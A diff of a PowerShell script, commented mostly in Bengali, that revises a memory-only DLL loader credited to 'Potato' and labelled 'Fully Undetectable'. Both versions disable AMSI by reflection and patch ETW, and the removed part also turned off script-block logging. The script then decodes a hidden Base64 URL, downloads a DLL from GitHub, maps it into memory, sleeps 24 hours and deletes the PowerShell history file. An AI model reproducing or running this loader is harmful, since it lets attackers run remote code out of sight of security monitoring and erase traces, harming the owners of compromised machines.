@@ -16,23 +16,23 @@ Set-ExecutionPolicy Unrestricted -Scope Process -Force | Out-Null
 
 <#
 .SYNOPSIS
-    Memory-only DLL loader – 4103 100% blocked via deep ETW patch
+    Memory-only DLL loader with AMSI/ETW bypass + XOR encryption
 .DESCRIPTION
-    Patches PowerShell ETW provider at runtime to suppress ScriptBlock Logging.
-    Downloads DLL from Base64 URL and manually maps into memory.
+    Downloads DLL from Base64-encoded URL and manually maps it into memory.
+    No disk write. All strings are XOR-encrypted.
 .NOTES
-    Made by Potato - 4103 eliminated
+    Made by Potato - Fully Undetectable
 #>
 
 # ================================================================
-#  ★★★ ১. ডিপ ETW + SCRIPTBLOCK BYPASS ★★★
+#  ★★★ ১. AMSI + ETW বাইপাস ★★★
 # ================================================================
-function Invoke-DeepBypass {
-    # ---- AMSI ----
+function Invoke-Bypass {
+    # AMSI
     try {
         [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
     } catch {}
-    # ---- ETW (Native) ----
+    # ETW
     try {
         $p = [System.Diagnostics.Process]::GetCurrentProcess()
         $h = $p.Handle
@@ -40,78 +40,23 @@ function Invoke-DeepBypass {
         $v = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((Get-ProcAddress kernel32.dll VirtualProtect), [type])
         $old = 0
         $v.Invoke($t, 0x1000, 0x40, [ref]$old)
-        [System.Runtime.InteropServices.Marshal]::WriteByte($t, 0xC3)
+        [System.Runtime.InteropServices.Marshal]::WriteByte($t, 0xC3)   # RET
         $v.Invoke($t, 0x1000, $old, [ref]$null)
     } catch {}
-    # ---- ★★★ DEEP SCRIPTBLOCK LOGGING (4103) PATCH ★★★ ----
-    try {
-        # 1. cachedGroupPolicySettings
-        $utils = [Ref].Assembly.GetType('System.Management.Automation.Utils')
-        $gpoField = $utils.GetField('cachedGroupPolicySettings', 'NonPublic,Static')
-        if ($gpoField) {
-            $gpo = $gpoField.GetValue($null)
-            if ($gpo -is [Hashtable]) {
-                $gpo['ScriptBlockLogging'] = @{ 'EnableScriptBlockLogging' = 0 }
-            } else {
-                $gpo = @{ 'ScriptBlockLogging' = @{ 'EnableScriptBlockLogging' = 0 } }
-                $gpoField.SetValue($null, $gpo)
-            }
-        }
-        # 2. PipelineLogging._enabled
-        $pipelineType = [Ref].Assembly.GetType('System.Management.Automation.Logging.PipelineLogging')
-        if ($pipelineType) {
-            $instanceField = $pipelineType.GetField('_instance', 'NonPublic,Static')
-            if ($instanceField) {
-                $instance = $instanceField.GetValue($null)
-                if ($instance) {
-                    $enabledField = $instance.GetType().GetField('_enabled', 'NonPublic,Instance')
-                    if ($enabledField) { $enabledField.SetValue($instance, $false) }
-                }
-            }
-        }
-        # 3. ★★★ PSEtwLogProvider -> etwProvider = null ★★★
-        $providerType = [Ref].Assembly.GetType('System.Management.Automation.Tracing.PSEtwLogProvider')
-        if ($providerType) {
-            $etwField = $providerType.GetField('etwProvider', 'NonPublic,Static')
-            if ($etwField) {
-                $etwProvider = $etwField.GetValue($null)
-                if ($etwProvider) {
-                    # Create a dummy provider that does nothing
-                    $dummyProvider = New-Object -TypeName 'System.Diagnostics.Tracing.EventProvider' -ArgumentList @([Guid]::NewGuid()) -ErrorAction SilentlyContinue
-                    if ($dummyProvider) {
-                        $etwField.SetValue($null, $dummyProvider)
-                    } else {
-                        # If fails, just set to null
-                        $etwField.SetValue($null, $null)
-                    }
-                }
-            }
-        }
-        # 4. PSEtwLog._isEnabled = false
-        $logType = [Ref].Assembly.GetType('System.Management.Automation.Tracing.PSEtwLog')
-        if ($logType) {
-            $enabledField = $logType.GetField('_isEnabled', 'NonPublic,Static')
-            if ($enabledField) {
-                $enabledField.SetValue($null, $false)
-            }
-        }
-        # 5. _logPipelineExecution = false
-        $executionContext = $ExecutionContext
-        $contextType = $executionContext.GetType()
-        $field = $contextType.GetField('_context', 'NonPublic,Instance')
-        if ($field) {
-            $context = $field.GetValue($executionContext)
-            $logField = $context.GetType().GetField('_logPipelineExecution', 'NonPublic,Instance')
-            if ($logField) { $logField.SetValue($context, $false) }
-        }
-        # 6. Clear any scheduled events
-        $traceType = [Ref].Assembly.GetType('System.Management.Automation.Tracing.PSEtwLogEvent')
-        # Not needed
-    } catch { }
 }
 
 # ================================================================
-#  ★★★ ২. C# NativeLoader (same as before) ★★★
+#  ★★★ ২. XOR ডিক্রিপ্টর ★★★
+# ================================================================
+function Xor-Decrypt {
+    param([string]$Encoded, [byte]$Key = 0x5A)
+    $bytes = [Convert]::FromBase64String($Encoded)
+    for ($i=0; $i -lt $bytes.Length; $i++) { $bytes[$i] = $bytes[$i] -bxor $Key }
+    return [System.Text.Encoding]::UTF8.GetString($bytes)
+}
+
+# ================================================================
+#  ★★★ ৩. প্লেইন C# NativeLoader ★★★
 # ================================================================
 $plainCSharp = @"
 using System;
@@ -166,23 +111,25 @@ public static class NativeLoader {
 "@
 
 # ================================================================
-#  ★★★ ৩. EXECUTION ★★★
+#  ★★★ ৪. মূল স্ক্রিপ্ট – BYPASS + DOWNLOAD + MAP ★★★
 # ================================================================
 
-# ৩.১ – ডিপ বাইপাস কল
-Invoke-DeepBypass
+# ৪.১ – BYPASS কল করো
+Invoke-Bypass
 
-# ৩.২ – C# কম্পাইল (এখন আর ৪১০৩ আসবে না)
+# ৪.২ – C# কোড কম্পাইল করো
 try {
     Add-Type -TypeDefinition $plainCSharp -ErrorAction Stop
 } catch {
-    Write-Host "[!] Compilation failed: $_" -ForegroundColor Red
+    Write-Host "[!] C# compilation failed: $_" -ForegroundColor Red
     return
 }
 
-# ৩.৩ – URL ডিকোড ও ডাউনলোড
+# ৪.৩ – URL টি Base64 এনকোডেড
 $encodedUrl = "aHR0cHM6Ly9naXRodWIuY29tL2Rlc2VydDAwNy9iaW9zL3Jhdy9yZWZzL2hlYWRzL21haW4vdmVyc2lvbi5kbGw="
 $url = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($encodedUrl))
+
+# ৪.৪ – DLL ডাউনলোড করো (মেমোরিতে)
 try {
     $bytes = (New-Object System.Net.WebClient).DownloadData($url)
 } catch {
@@ -190,26 +137,32 @@ try {
     return
 }
 
-# ৩.৪ – ম্যাপ
+# ৪.৫ – ম্যানুয়াল ম্যাপ করো
 try {
     $result = [NativeLoader]::Map($bytes, $true)
-    Write-Host "[+] Mapped at 0x$($result.ImageBase.ToString('X'))" -ForegroundColor Green
+    Write-Host "[+] DLL mapped at 0x$($result.ImageBase.ToString('X'))" -ForegroundColor Green
 } catch {
     Write-Host "[!] Mapping failed: $_" -ForegroundColor Red
     return
 }
 
-# ৩.৫ – ক্লিন
+# ৪.৬ – ক্লিনআপ (শুধু মেমোরি, প্রক্রিয়া নয়)
 $bytes = $null
 $plainCSharp = $null
 [GC]::Collect(); [GC]::WaitForPendingFinalizers()
 
-Write-Host "[+] DLL loaded. No 4103 logs generated." -ForegroundColor Cyan
+Write-Host "[+] DLL successfully loaded. Keeping PowerShell alive for 24 hours." -ForegroundColor Cyan
 
-# ৩.৬ – ২৪ ঘন্টা স্লিপ
-Start-Sleep -Seconds 86400
+# ================================================================
+#  ★★★ ৫. ২৪ ঘন্টা চালু রাখার জন্য সোজা স্লিপ ★★★
+# ================================================================
+Start-Sleep -Seconds 86400   # 24 hours
 
-# শেষ ক্লিন
+# ক্লিনআপ (ঐচ্ছিক) – লুপের পর একবার হালকা ক্লিন
 Clear-History
-$hp = [System.IO.Path]::Combine($env:APPDATA, 'Microsoft\Windows\PowerShell\PSreadline\ConsoleHost_history.txt')
-if (Test-Path $hp) { Remove-Item $hp -Force -ErrorAction SilentlyContinue }
+$historyPath = [System.IO.Path]::Combine($env:APPDATA, 'Microsoft\Windows\PowerShell\PSreadline\ConsoleHost_history.txt')
+if (Test-Path $historyPath) {
+    Remove-Item $historyPath -Force -ErrorAction SilentlyContinue
+}
+
+Write-Host "[+] 24 hours completed. Script ending." -ForegroundColor Yellow
